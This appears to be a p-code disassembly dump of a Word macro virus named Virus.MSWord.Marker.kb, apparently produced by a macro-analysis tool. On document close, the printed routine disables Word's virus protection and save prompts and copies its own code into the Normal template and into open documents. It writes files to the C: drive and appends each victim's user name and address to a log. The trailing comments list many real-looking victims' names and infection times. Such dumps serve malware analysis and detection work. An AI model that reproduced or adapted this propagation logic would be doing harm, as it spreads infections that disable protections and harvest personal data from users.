' 13:30:44 - Tuesday, 12 Mar 2002
' Replication System
'


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.kb
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 48968 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	LitStr 0x0001 "a"
' 	Ld ListBox1 
' 	MemSt Text1 
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x0019 " DSR & FHS , KZ, Kostanai"
' Line #6:
' 	QuoteRem 0x0000 0x001A " KGU-EMF by DSR & FHS v0.1"
' Line #7:
' 	FuncDefn (Private Sub Document_Close())
' Line #8:
' Line #9:
' 	OnError (Resume Next) 
' Line #10:
' Line #11:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #12:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #13:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #14:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #15:
' Line #16:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #17:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #18:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #19:
' Line #20:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #21:
' 	LitStr 0x001A "' DSR & FHS , KZ, Kostanai"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #22:
' Line #23:
' 	QuoteRem 0x0000 0x004B "Switch the VirusProtection OFF, ConfirmConversion OFF, SaveNormalPrompt OFF"
' Line #24:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #25:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #26:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #27:
' Line #28:
' Line #29:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Ne 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #30:
' Line #31:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #33:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #38:
' Line #39:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #40:
' 	LitStr 0x000A "C:\bootlog"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #41:
' Line #42:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #45:
' Line #46:
' 	LitStr 0x000D "c:\netlog.sys"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "For YOU"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "SCOOTER"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "Wellcome to Calipso"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "FasterHarderScooter"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "Scooter on the Web: www.scooterweb.de"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "Wiritten by FHS & DSR (KZ, Kostanai town, KGU)"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "This is a simple example"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "read "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #56:
' Line #57:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #58:
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' Line #62:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #63:
' 	LineCont 0x0014 08 00 03 00 0F 00 03 00 17 00 03 00 1E 00 03 00 25 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #64:
' Line #65:
' Line #66:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #67:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #68:
' Line #69:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #70:
' Line #71:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #72:
' Line #73:
' Line #74:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #75:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #76:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #77:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #78:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	ElseBlock 
' Line #81:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' Line #85:
' 	LineCont 0x001C 09 00 0E 00 12 00 0E 00 1B 00 0E 00 24 00 0E 00 2D 00 15 00 39 00 0E 00 44 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0015 "* DSR & FHS , KGU EMF"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0022 "00:15:54  -  Wednesday, 22.12.1999"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	LitStr 0x0029 "KZ, Kostanai, KGU EMF Applied Mathematics"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000B "hh:mm:ss - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #86:
' Line #87:
' Line #88:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #89:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #90:
' Line #91:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #92:
' Line #93:
' 	EndIfBlock 
' Line #94:
' Line #95:
' Line #96:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #97:
' 	LineCont 0x0004 05 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld DocumentInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #98:
' Line #99:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #100:
' Line #101:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #102:
' Line #103:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #104:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #105:
' Line #106:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' Line #110:
' Line #111:
' 	EndIfBlock 
' Line #112:
' Line #113:
' 	EndSub 
' Line #114:
' Line #115:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #116:
' Line #117:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #118:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #119:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #120:
' 	QuoteRem 0x0000 0x001D " 19:20:14 - ñðåäà, 3 ìàé 2000"
' Line #121:
' 	QuoteRem 0x0000 0x001E " Ïîæåëàë  îñòàòüñÿ íåèçâåñòíûì"
' Line #122:
' 	QuoteRem 0x0000 0x0000 ""
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #127:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #128:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #129:
' 	QuoteRem 0x0000 0x0024 " 11:36:42 - âîñêðåñåíüå, 14 ìàé 2000"
' Line #130:
' 	QuoteRem 0x0000 0x0010 " Khudyakov Yuriy"
' Line #131:
' 	QuoteRem 0x0000 0x0000 ""
' Line #132:
' Line #133:
' Line #134:
' Line #135:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #136:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #137:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #138:
' 	QuoteRem 0x0000 0x0024 " 16:27:56 - ïîíåäåëüíèê, 15 ìàé 2000"
' Line #139:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #140:
' 	QuoteRem 0x0000 0x0000 ""
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #145:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #146:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #147:
' 	QuoteRem 0x0000 0x0020 " 16:55:46 - âòîðíèê, 16 ìàé 2000"
' Line #148:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #149:
' 	QuoteRem 0x0000 0x0000 ""
' Line #150:
' Line #151:
' Line #152:
' Line #153:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #154:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #155:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #156:
' 	QuoteRem 0x0000 0x001E " 10:25:20 - ñðåäà, 17 ìàé 2000"
' Line #157:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #158:
' 	QuoteRem 0x0000 0x0000 ""
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #163:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #164:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #165:
' 	QuoteRem 0x0000 0x001E " 10:48:08 - ñðåäà, 17 ìàé 2000"
' Line #166:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #167:
' 	QuoteRem 0x0000 0x0000 ""
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #172:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #173:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #174:
' 	QuoteRem 0x0000 0x001E " 10:53:13 - ñðåäà, 17 ìàé 2000"
' Line #175:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #176:
' 	QuoteRem 0x0000 0x0000 ""
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #181:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #182:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #183:
' 	QuoteRem 0x0000 0x001E " 15:46:39 - ñðåäà, 17 ìàé 2000"
' Line #184:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #190:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #191:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #192:
' 	QuoteRem 0x0000 0x0020 " 15:10:05 - ÷åòâåðã, 18 ìàé 2000"
' Line #193:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #194:
' 	QuoteRem 0x0000 0x0000 ""
' Line #195:
' Line #196:
' Line #197:
' Line #198:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #199:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #200:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #201:
' 	QuoteRem 0x0000 0x0020 " 14:57:33 - âòîðíèê, 23 ìàé 2000"
' Line #202:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #203:
' 	QuoteRem 0x0000 0x0000 ""
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #208:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #209:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #210:
' 	QuoteRem 0x0000 0x0020 " 16:42:02 - âòîðíèê, 23 ìàé 2000"
' Line #211:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #212:
' 	QuoteRem 0x0000 0x0000 ""
' Line #213:
' Line #214:
' Line #215:
' Line #216:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #217:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #218:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #219:
' 	QuoteRem 0x0000 0x001E " 10:13:04 - ñðåäà, 24 ìàé 2000"
' Line #220:
' 	QuoteRem 0x0000 0x0009 " Õóäÿêîâà"
' Line #221:
' 	QuoteRem 0x0000 0x0000 ""
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #226:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #227:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #228:
' 	QuoteRem 0x0000 0x0020 " 10:51:44 - ñóááîòà, 17 èþí 2000"
' Line #229:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #230:
' 	QuoteRem 0x0000 0x0000 ""
' Line #231:
' Line #232:
' Line #233:
' Line #234:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #235:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #236:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #237:
' 	QuoteRem 0x0000 0x0020 " 10:56:16 - ñóááîòà, 17 èþí 2000"
' Line #238:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #239:
' 	QuoteRem 0x0000 0x0000 ""
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #244:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #245:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #246:
' 	QuoteRem 0x0000 0x0020 " 10:57:13 - ñóááîòà, 17 èþí 2000"
' Line #247:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #248:
' 	QuoteRem 0x0000 0x0000 ""
' Line #249:
' Line #250:
' Line #251:
' Line #252:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #253:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #254:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #255:
' 	QuoteRem 0x0000 0x0020 " 12:11:33 - ñóááîòà, 17 èþí 2000"
' Line #256:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #257:
' 	QuoteRem 0x0000 0x0000 ""
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #262:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #263:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #264:
' 	QuoteRem 0x0000 0x0024 " 13:26:34 - ïîíåäåëüíèê, 19 èþí 2000"
' Line #265:
' 	QuoteRem 0x0000 0x000E " Reanimator 98"
' Line #266:
' 	QuoteRem 0x0000 0x0000 ""
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #271:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #272:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #273:
' 	QuoteRem 0x0000 0x0020 " 13:33:11 - âòîðíèê, 27 èþí 2000"
' Line #274:
' 	QuoteRem 0x0000 0x000E " Ñ.Õ. Åñåíáàåâ"
' Line #275:
' 	QuoteRem 0x0000 0x0000 ""
' Line #276:
' Line #277:
' Line #278:
' Line #279:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #280:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #281:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #282:
' 	QuoteRem 0x0000 0x0020 " 14:13:47 - âòîðíèê, 27 èþí 2000"
' Line #283:
' 	QuoteRem 0x0000 0x000E " Ñ.Õ. Åñåíáàåâ"
' Line #284:
' 	QuoteRem 0x0000 0x0000 ""
' Line #285:
' Line #286:
' Line #287:
' Line #288:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #289:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #290:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #291:
' 	QuoteRem 0x0000 0x001E " 14:49:56 - ñðåäà, 28 èþí 2000"
' Line #292:
' 	QuoteRem 0x0000 0x0010 " Indi G.Ospanova"
' Line #293:
' 	QuoteRem 0x0000 0x0000 ""
' Line #294:
' Line #295:
' Line #296:
' Line #297:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #298:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #299:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #300:
' 	QuoteRem 0x0000 0x0024 " 14:12:22 - ïîíåäåëüíèê, 17 èþë 2000"
' Line #301:
' 	QuoteRem 0x0000 0x000A " Àëåêñàíäð"
' Line #302:
' 	QuoteRem 0x0000 0x0000 ""
' Line #303:
' Line #304:
' Line #305:
' Line #306:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #307:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #308:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #309:
' 	QuoteRem 0x0000 0x0024 " 14:16:56 - ïîíåäåëüíèê, 17 èþë 2000"
' Line #310:
' 	QuoteRem 0x0000 0x000A " Àëåêñàíäð"
' Line #311:
' 	QuoteRem 0x0000 0x0000 ""
' Line #312:
' Line #313:
' Line #314:
' Line #315:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #316:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #317:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #318:
' 	QuoteRem 0x0000 0x0020 " 18:26:40 - âòîðíèê, 18 èþë 2000"
' Line #319:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #320:
' 	QuoteRem 0x0000 0x0000 ""
' Line #321:
' Line #322:
' Line #323:
' Line #324:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #325:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #326:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #327:
' 	QuoteRem 0x0000 0x0020 " 08:22:23 - ÷åòâåðã, 20 èþë 2000"
' Line #328:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #329:
' 	QuoteRem 0x0000 0x0000 ""
' Line #330:
' Line #331:
' Line #332:
' Line #333:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #334:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #335:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #336:
' 	QuoteRem 0x0000 0x0020 " 10:33:06 - ÷åòâåðã, 20 èþë 2000"
' Line #337:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #338:
' 	QuoteRem 0x0000 0x0000 ""
' Line #339:
' Line #340:
' Line #341:
' Line #342:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #343:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #344:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #345:
' 	QuoteRem 0x0000 0x0020 " 18:08:01 - ÷åòâåðã, 20 èþë 2000"
' Line #346:
' 	QuoteRem 0x0000 0x000B "  Àëåêñàíäð"
' Line #347:
' 	QuoteRem 0x0000 0x0000 ""
' Line #348:
' Line #349:
' Line #350:
